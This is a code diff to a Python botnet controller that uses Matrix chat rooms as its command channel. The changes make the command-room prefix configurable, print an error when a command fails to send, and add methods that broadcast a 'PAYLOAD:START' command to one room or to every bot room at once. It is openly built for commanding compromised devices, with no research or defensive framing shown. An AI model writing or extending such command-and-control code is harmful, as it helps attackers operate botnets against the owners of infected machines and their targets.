@@ -90,7 +90,7 @@ class BotnetController:
 
     def __init__(self):
         self.device_id = "BOTCONTROLLER"
-        self.pinging = False
+        self.command_room_prefix = "cmd_"
         self.client = MatrixClient(MATRIX_HOMESERVER)
         self.command_rooms = {}
         self.command_room_lock = threading.Lock()
@@ -126,15 +126,16 @@ class BotnetController:
     def sync_rooms(self):
         joined_rooms: dict[str, Room] = self.client.rooms
         for id, room in joined_rooms.items():
-            if room.name.startswith("cmd_"):
+            if room.name.startswith(self.command_room_prefix):
                 with self.command_room_lock:
                     self.command_rooms[id] = CommandRoom(room)
             elif room.name == "announcements":
                 self.announce_room = self.join_room(ANNOUNCE_ROOM_ID)
 
     def send_command(self, command: str, room: CommandRoom):
-        response = room.send_cmd(f"COMMAND:{command}")
-        # TODO: check for successfull response?
+        status = room.send_cmd(f"COMMAND:{command}")
+        if not status:
+            print("COULD NOT SEND COMMAND:", command)
         
     def send_to_all(self, command: str):
         with self.command_room_lock:
@@ -205,6 +206,13 @@ class BotnetController:
         new_room = self.create_room(f"cmd_{name}")
         with self.command_room_lock:
             self.command_rooms[new_room.room_id] = CommandRoom(new_room)
+
+    def start_payload_on_room(self, room: CommandRoom):
+        self.send_command("PAYLOAD:START", room)
+    
+    def start_payload_all_rooms(self):
+        for id, room in self.command_rooms.items():
+            self.start_payload_on_room(room)
 
     def ping_loop(self):
         time.sleep(2)
